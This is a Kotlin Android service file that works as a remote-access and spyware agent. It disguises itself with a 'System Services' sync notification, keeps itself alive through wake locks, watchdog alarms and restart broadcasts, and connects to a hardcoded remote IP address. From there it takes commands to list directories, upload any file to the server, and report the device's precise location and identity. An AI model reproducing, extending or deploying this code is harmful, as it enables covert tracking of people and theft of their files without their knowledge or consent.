package com.example.sitconnect

import android.Manifest
import android.app.AlarmManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.annotation.RequiresPermission
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.android.gms.tasks.Tasks
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.InetSocketAddress
import java.net.Socket
import java.util.Locale
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class AgentService : Service() {

    companion object {
        const val CHANNEL_ID = "C2_SERVICE_CHANNEL"
        const val NOTIFICATION_ID = 101
        // Keep this process-wide so recreated Service instances cannot spawn duplicate agent loops.
        private val isAgentRunning = AtomicBoolean(false)
    }

    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null

    override fun onCreate() {
        super.onCreate()
        // Create channel immediately when service is created
        createNotificationChannel()

        // Acquire WakeLock to keep CPU running
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AgentService::WakeLock")
        wakeLock?.acquire()

        // Acquire WifiLock to keep network active
        val wifiManager = applicationContext.getSystemService(WIFI_SERVICE) as WifiManager
        @Suppress("DEPRECATION")
        wifiLock = wifiManager.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "AgentService::WifiLock")
        wifiLock?.acquire()
    }

    override fun onDestroy() {
        super.onDestroy()
        if (wakeLock?.isHeld == true) {
            wakeLock?.release()
        }
        if (wifiLock?.isHeld == true) {
            wifiLock?.release()
        }

        scheduleRestart(this)
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        scheduleRestart(this)
    }

    private fun scheduleRestart(context: Context) {
        val restartIntent = Intent(context, RestartReceiver::class.java).apply {
            action = "com.example.sitconnect.RESTART_SERVICE"
        }
        // Send direct broadcast first for immediate restart if process is alive
        context.sendBroadcast(restartIntent)

        // Schedule an alarm for fail-safe restart in case process is dying
        val pendingIntent = PendingIntent.getBroadcast(
            context,
            0,
            restartIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager
        // If exact alarm permission is granted, use it. Otherwise approximate.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
             if (alarmManager?.canScheduleExactAlarms() == true) {
                 alarmManager.setExactAndAllowWhileIdle(
                     AlarmManager.RTC_WAKEUP,
                     System.currentTimeMillis() + 1000,
                     pendingIntent
                 )
             } else {
                 alarmManager?.setAndAllowWhileIdle(
                     AlarmManager.RTC_WAKEUP,
                     System.currentTimeMillis() + 1000,
                     pendingIntent
                 )
             }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager?.setExactAndAllowWhileIdle(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 1000,
                pendingIntent
            )
        } else {
            alarmManager?.setExact(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 1000,
                pendingIntent
            )
        }
    }

    private lateinit var fusedLocationClient: FusedLocationProviderClient

    @RequiresPermission(allOf = [Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION])
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Services")
                .setContentText("Running background synchronization")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build()

            // On API 29+ we must pass the foreground service type(s) declared in the manifest.
            // On Android 14+ (API 34+) omitting the type throws MissingForegroundServiceTypeException.
            // IMPORTANT: only include FOREGROUND_SERVICE_TYPE_LOCATION if the permission is already
            // granted — passing it without permission throws SecurityException and crashes the service.
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val hasLocation = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) ==
                        android.content.pm.PackageManager.PERMISSION_GRANTED ||
                        checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) ==
                        android.content.pm.PackageManager.PERMISSION_GRANTED

                val serviceType = if (hasLocation) {
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                } else {
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                }
                startForeground(NOTIFICATION_ID, notification, serviceType)
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            Log.e("AgentService", "Error starting foreground service", e)
            // Fallback: try starting without explicit type if possible or just continue (service might be killed)
            try {
                val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("System Services")
                    .setContentText("Running background synchronization")
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .build()
                startForeground(NOTIFICATION_ID, notification)
            } catch (e2: Exception) {
                Log.e("AgentService", "Failed to start foreground service", e2)
            }
        }

        // Schedule a watchdog alarm to ensure the service stays alive (or revives if killed)
        scheduleWatchdog()

        // Guard against multiple threads being spawned if onStartCommand is called again
        // (e.g. from both MainActivity and BootReceiver, or on service restart via START_STICKY)
        if (isAgentRunning.compareAndSet(false, true)) {
            // Only delay on boot — not on restarts caused by permission changes or system kills
            val fromBoot = intent?.getBooleanExtra("from_boot", false) ?: false
            startPersistentAgent("139.59.244.51", 5001, fromBoot)
        }

        return START_STICKY
    }

    private fun scheduleWatchdog() {
        // Schedule an alarm to poke the service every 15 minutes to keep it alive/restart it
        val restartIntent = Intent(this, RestartReceiver::class.java).apply {
            action = "com.example.sitconnect.RESTART_SERVICE"
        }
        val pendingIntent = PendingIntent.getBroadcast(
            this,
            1001, // Unique Request Code for Watchdog
            restartIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val alarmManager = getSystemService(ALARM_SERVICE) as? AlarmManager
        val triggerTime = System.currentTimeMillis() + 15 * 60 * 1000 // 15 minutes

        // We use setAndAllowWhileIdle to ensure it fires even in Doze mode
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager?.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
        } else {
            alarmManager?.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
        }
    }

    // Android 15 (API 35) introduced a 6-hour timeout for dataSync foreground services.
    // Override onTimeout() to stop and restart the service gracefully instead of crashing.
    @RequiresApi(Build.VERSION_CODES.VANILLA_ICE_CREAM)
    override fun onTimeout(startId: Int, fgsType: Int) {
        Log.w("AgentService", "Timeout reached. Scheduling restart...")
        val restartIntent = Intent(applicationContext, AgentService::class.java)
        val pendingIntent = PendingIntent.getService(
            this, 1, restartIntent, PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
        // Restart in 5 seconds
        alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 5000, pendingIntent)
        isAgentRunning.set(false)
        stopSelf()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Background Agent Channel",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Used for background persistent connection"
            }
            val manager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    @androidx.annotation.RequiresPermission(allOf = [Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION])
    private fun startPersistentAgent(ip: String, port: Int, delayStart: Boolean = false) {
        Thread {
            try {
                // On boot, wait 10 seconds for Wi-Fi/Data to initialise before connecting.
                // On restarts (e.g. after a permission change), connect immediately.
                if (delayStart) {
                    Thread.sleep(10000)
                }

                while (true) {
                    try {
                        val socket = Socket()
                        socket.keepAlive = true
                        // socket.connect(InetSocketAddress(ip, port), 5000)
                        
                        // Use a longer timeout for connect, and set a read timeout to detect dead server
                        // socket.soTimeout = 0 // Infinite timeout is risky if NAT drops
                        // socket.soTimeout = 120000 // 2 minutes? No, let's stick to infinite but rely on keepAlive
                        
                        socket.connect(InetSocketAddress(ip, port), 10000)
                        
                        // Use BufferedReader instead of Scanner for more robust line reading
                        val reader = BufferedReader(InputStreamReader(socket.getInputStream()))
                        val output = PrintWriter(socket.getOutputStream(), true)

                        while (true) {
                            val command = reader.readLine() ?: break // null means stream closed (EOF)
                            
                            // Copy your command logic from MainActivity here
                            val response = when {
                                command == "ping" -> "pong"
                                command == "sys_info" -> getDeviceName()

                                command.startsWith("ls ") -> {
                                    val path = command.substringAfter("ls ")
                                    val directory = File(path)

                                    if (directory.exists() && directory.isDirectory) {
                                        val files = directory.listFiles()
                                        // Join file names with a newline for the Python server to read easily
                                        files?.joinToString(separator = "\n") { it.name } ?: "Directory is empty"
                                    } else {
                                        "Error: Path does not exist or is not a directory"
                                    }
                                }

                                command.startsWith("download ") -> {
                                    val filePath = command.substringAfter("download ")
                                    val file = File(filePath)

                                    if (file.exists() && file.isFile) {
                                        val originalTimeout = socket.soTimeout
                                        try {
                                            socket.soTimeout = 0 // Disable timeout for massive files
                                            output.println("SIZE ${file.length()}")

                                            file.inputStream().use { fileInput ->
                                                val buffer = ByteArray(65536) // Match the server's 64KB buffer
                                                var bytesRead: Int
                                                val socketOutput = socket.getOutputStream()
                                                while (fileInput.read(buffer).also { bytesRead = it } != -1) {
                                                    socketOutput.write(buffer, 0, bytesRead)
                                                }
                                                socketOutput.flush()
                                            }
                                            // Return null so the app doesn't send "File sent successfully"
                                            // The server is expecting exactly file_size bytes and nothing else.
                                            null
                                        } catch (e: Exception) {
                                            "Error: ${e.message}"
                                        } finally {
                                            socket.soTimeout = originalTimeout
                                        }
                                    } else {
                                        "Error: File not found"
                                    }
                                }

                                command == "location" -> getDeviceLocation()

                                else -> "Received: $command"
                            }
                            output.println(response)
                        }
                        
                        // If we break out, it means EOF (server closed connection)
                        Log.i("AgentService", "Server closed connection")
                        
                    } catch (e: Throwable) {
                        Log.e("AgentService", "Connection failed or error occurred, retrying in 10s: ${e.message}")
                        e.printStackTrace()
                        Thread.sleep(10000) // Wait longer between retries
                    }
                }
            } finally {
                // Allow a new thread to be started if this one ever exits
                isAgentRunning.set(false)
            }
        }.start()
    }

    fun getDeviceName(): String {
        val manufacturer = Build.MANUFACTURER
        val model = Build.MODEL
        var userDeviceName: String? = null
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N_MR1) { // API 25
                 userDeviceName = Settings.Global.getString(contentResolver, Settings.Global.DEVICE_NAME)
            }
        } catch (e: Exception) {
            // Ignore if we can't get the user-set name
        }

        return if (model.startsWith(manufacturer)) {
            userDeviceName?.let { "$it ($model)" } ?: model
        } else {
            userDeviceName?.let { "$it ($manufacturer $model)" } ?: "$manufacturer $model"
        }
    }

    fun getLocationAccessLevel(): String {
        val fineGranted = packageManager.checkPermission(
            Manifest.permission.ACCESS_FINE_LOCATION, packageName
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        val coarseGranted = packageManager.checkPermission(
            Manifest.permission.ACCESS_COARSE_LOCATION, packageName
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED

        if (!fineGranted && !coarseGranted) return "Disallowed"

        // On Android 10+ background access requires ACCESS_BACKGROUND_LOCATION
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val backgroundGranted = packageManager.checkPermission(
                Manifest.permission.ACCESS_BACKGROUND_LOCATION, packageName
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
            if (backgroundGranted) "Allowed all the time" else "Only while using the app"
        } else {
            "Allowed all the time" // Pre-Android 10 had no while-in-use restriction
        }
    }

    fun getLocationPermissionType(): String {
        val locationPermissionType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val fineGranted = packageManager.checkPermission(
                Manifest.permission.ACCESS_FINE_LOCATION, packageName
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
            if (fineGranted) "Precise" else "Approximate"
        } else {
            "Precise" // Pre-Android 12 had no approximate-only option
        }
        return locationPermissionType
    }

    fun locationUnavailable(): String {
        var locationString = "Location unavailable"
        locationString += "\nLocation Permission: ${getLocationPermissionType()}"
        locationString += "\nLocation Access: ${getLocationAccessLevel()}"
        return locationString
    }

    @RequiresPermission(allOf = [Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION])
    fun getDeviceLocation(): String {
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        var locationString = ""

        return try {
            val location = Tasks.await(fusedLocationClient.lastLocation, 3, TimeUnit.SECONDS)
            if (location != null) {
                val coordinates = String.format(Locale.US, "%.6f, %.6f", location.latitude, location.longitude)
                locationString = "Location: $coordinates"
                val altitude = location.altitude
                locationString += "\nAltitude: $altitude"
                val speed = location.speed
                locationString += "\nSpeed: $speed"
                val accuracy = location.accuracy
                locationString += "\nAccuracy: $accuracy"
                locationString += "\nLocation Permission: ${getLocationPermissionType()}"
                locationString += "\nLocation Access: ${getLocationAccessLevel()}"
                val bearing = location.bearing
                locationString += "\nBearing: $bearing"
//                var time = location.time
//                locationString += "\nTime: $time"
                val provider = location.provider
                locationString += "\nProvider: $provider"
                val isMock = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    location.isMock
                } else {
                    @Suppress("DEPRECATION")
                    location.isFromMockProvider
                }
                locationString += "\nIs From Mock Provider: $isMock"
                locationString
            } else {
                // If location cannot be determined (e.g. only while using the app and user is not in app)
                locationUnavailable()
            }
        } catch (e: Exception) {
            // If location access is denied.
            locationUnavailable()
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
